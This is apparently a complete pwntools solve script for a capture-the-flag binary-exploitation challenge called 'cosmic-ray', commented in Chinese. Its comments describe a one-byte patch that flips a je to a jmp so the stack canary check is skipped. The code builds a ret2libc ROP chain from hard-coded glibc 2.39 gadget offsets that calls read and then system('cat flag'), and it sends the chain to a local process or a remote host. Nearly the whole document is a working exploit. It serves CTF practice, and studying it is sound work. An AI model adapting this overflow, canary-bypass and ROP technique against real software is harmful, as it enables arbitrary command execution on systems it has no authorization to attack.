#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# cosmic-ray 完整解题脚本
# 用法: python3 solve_full.py [local|remote] [host] [port]
#
# 原理:
#   1) 程序 pwn 的 main 里有一个栈溢出 (read(0, buf, 0xf0), buf 只有 0x50)，
#      但存在 stack canary 检查:
#          0x1202: mov rdx, [rbp-8]        ; rdx = 我们写入的 canary
#          0x1206: sub rdx, fs:[0x28]      ; 与真实 canary 比较
#          0x120f: je  0x1216              ; 相等则跳过 __stack_chk_fail
#          0x1211: call __stack_chk_fail
#          0x1216: leave
#          0x1217: ret
#   2) 用"宇宙射线"把 0x120f 处的 0x74 (je) 改成 0xeb (jmp)，
#      使 canary 检查被无条件跳过。
#   3) 服务端会把子进程的 /proc/<pid>/maps 发给我们，因此 libc 基址已知。
#   4) exp 用 ret2libc: read(0, libc.bss, 0x10) 把 "cat flag\x00" 写入
#      libc 的可写 .bss，再 system("cat flag") 打印 flag。
import os
import re
import sys
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
context.timeout = 15

HERE = os.path.dirname(os.path.abspath(__file__))

MODE = sys.argv[1] if len(sys.argv) > 1 else 'local'
HOST = sys.argv[2] if len(sys.argv) > 2 else '127.0.0.1'
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 9999

# ---- 来自附件 libc.so.6 的偏移 (glibc 2.39 / ubuntu 24.04) ----
POP_RDI = 0x10c08d   # pop rdi ; ret
POP_RSI = 0x110b7d   # pop rsi ; ret
POP_RDX = 0x8d6a     # pop rdx ; ret
READ    = 0x11bd20   # read
SYSTEM  = 0x58750    # system
BSS     = 0x2056e0   # libc 可写 .bss

# 栈帧布局 (main):
#   buf     = rbp - 0x60
#   canary  = rbp - 0x08   ->  距 buf 0x58 = 88
#   savedrbp= rbp          ->  距 buf 0x60 = 96
#   ret     = rbp + 0x08   ->  距 buf 0x68 = 104
OFF_TO_CANARY = 88
OFF_TO_RET    = 104

# 每轮: (patch 文件偏移, 单字节, 自定义类型)
ROUNDS = [
    (0x120f, 0xeb, 'ret2libc'),   # je(0x74) -> jmp(0xeb), 绕过 canary
]


def build_payload(kind, libc_base):
    if kind == 'ret2libc':
        payload = b'A' * OFF_TO_CANARY          # 填到 canary
        payload += b'B' * 8                     # canary (检查已被跳过, 随便填)
        payload += b'C' * 8                     # saved rbp
        # read(0, bss, 0x10)
        payload += p64(libc_base + POP_RDI) + p64(0)
        payload += p64(libc_base + POP_RSI) + p64(libc_base + BSS)
        payload += p64(libc_base + POP_RDX) + p64(0x10)
        payload += p64(libc_base + READ)
        # system(bss)  ==  system("cat flag")
        payload += p64(libc_base + POP_RDI) + p64(libc_base + BSS)
        payload += p64(libc_base + SYSTEM)
        # 关键: 主函数里第一次 read 最多读 0xf0=240 字节,
        # 把 ROP 链刚好垫到 240 字节, 后面的 "cat flag\x00" 留给第二次 read 读入 bss。
        payload = payload.ljust(240, b'\x00')
        payload += b'cat flag\x00'
        return payload
    raise NotImplementedError(kind)


def start():
    if MODE == 'remote':
        return remote(HOST, PORT)
    env = dict(os.environ)
    env['ROUND'] = str(1)
    env['BLOCK_LIMIT'] = str(0)
    return process(['python3', 'chal.py'], cwd=HERE, env=env)


def main():
    p = start()

    for idx, (off, byte, kind) in enumerate(ROUNDS, 1):
        p.recvuntil(b'location (hex file offset): ')
        p.sendline(hex(off).encode())

        p.recvuntil(b'machine code (hex byte): ')
        p.sendline(hex(byte).encode())

        data = p.recvuntil(b'Enter exp (hex): ')
        libc_base = None
        for line in data.split(b'\n'):
            if b'libc.so.6' in line:
                libc_base = int(line.split(b'-')[0], 16)
                break
        assert libc_base is not None, 'libc base not found'
        log.success('[%d/%d] patch %#x -> %#x  (%s)  libc=%#x'
                    % (idx, len(ROUNDS), off, byte, kind, libc_base))

        p.sendline(build_payload(kind, libc_base).hex().encode())

    out = p.recvall(timeout=10)
    m = re.search(rb'flag\{[^}]*\}', out)
    if m and b'Well Done' in out:
        log.success('flag = %s' % m.group().decode())
    else:
        log.failure('failed')
        print(out.decode(errors='replace')[-400:])


if __name__ == '__main__':
    main()
